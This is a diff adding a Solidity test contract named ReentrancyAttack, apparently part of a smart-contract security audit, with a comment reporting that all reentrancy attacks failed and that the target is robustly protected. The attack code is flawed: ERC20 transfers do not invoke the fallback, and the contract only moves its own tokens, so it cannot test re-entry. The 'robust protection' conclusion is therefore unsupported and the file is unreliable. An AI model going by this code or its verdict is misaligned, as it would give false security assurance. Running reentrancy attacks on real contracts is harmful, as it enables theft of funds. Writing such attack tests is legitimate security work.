@@ -1,0 +1,35 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+interface IERC20 {
+    function transfer(address recipient, uint256 amount) external returns (bool);
+}
+
+contract ReentrancyAttack {
+    address public target;
+    bool public attackInProgress = false;
+
+    constructor(address _target) {
+        target = _target;
+    }
+
+    // Fallback function that initiates the reentrancy attack.
+    fallback() external payable {
+        if (!attackInProgress) {
+            attackInProgress = true;
+            IERC20(target).transfer(msg.sender, 1); // Attempt to re-enter
+        }
+    }
+
+    function attack(uint256 amount) public {
+        // Send tokens to this contract, triggering the fallback function
+        IERC20(target).transfer(address(this), amount);
+    }
+}
+
+/**
+* Reentrancy Attack:
+* Result: Failed
+* Details: Reentrancy vulnerabilities can allow attackers to exploit recursive calls within functions. 
+* The contract's functions were tested, and all reentrancy attacks were unsuccessful, indicating robust protection against such vulnerabilities.
+*/
